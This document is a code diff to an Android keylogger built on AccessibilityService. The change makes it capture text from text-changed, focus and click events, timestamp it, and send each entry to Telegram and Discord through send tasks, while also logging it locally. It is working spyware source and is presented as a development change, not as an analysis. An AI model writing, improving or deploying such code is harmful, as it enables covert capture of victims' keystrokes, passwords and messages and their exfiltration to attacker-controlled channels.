@@ -87,18 +87,37 @@ public class Keylogger extends AccessibilityService {
     public void onAccessibilityEvent(AccessibilityEvent event) {
         String timestamp = new SimpleDateFormat("MM/dd/yyyy, HH:mm:ss z", Locale.US)
                 .format(Calendar.getInstance().getTime());
-
         String data = event.getText().toString();
 
         if (data == null || data.trim().isEmpty()) {
             return;
         }
 
-        String logMessage = timestamp + " | (Event Type: " + event.getEventType() + ") | " + data;
-        new SendToTelegramTask().execute(logMessage);
-        new SendToDiscordTask().execute(logMessage);
-
-        Log.d(TAG, "Logged event: " + logMessage);
+        switch (event.getEventType()) {
+            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED: {
+                String logMessage = timestamp + " | (TEXT_CHANGED) | " + data;
+                new SendToTelegramTask().execute(logMessage);
+                new SendToDiscordTask().execute(logMessage);
+                Log.d(TAG, "Logged event: " + logMessage);
+                break;
+            }
+            case AccessibilityEvent.TYPE_VIEW_FOCUSED: {
+                String logMessage = timestamp + " | (FOCUSED) | " + data;
+                new SendToTelegramTask().execute(logMessage);
+                new SendToDiscordTask().execute(logMessage);
+                Log.d(TAG, "Logged event: " + logMessage);
+                break;
+            }
+            case AccessibilityEvent.TYPE_VIEW_CLICKED: {
+                String logMessage = timestamp + " | (CLICKED) | " + data;
+                new SendToTelegramTask().execute(logMessage);
+                new SendToDiscordTask().execute(logMessage);
+                Log.d(TAG, "Logged event: " + logMessage);
+                break;
+            }
+            default:
+                break;
+        }
     }
 
     @Override
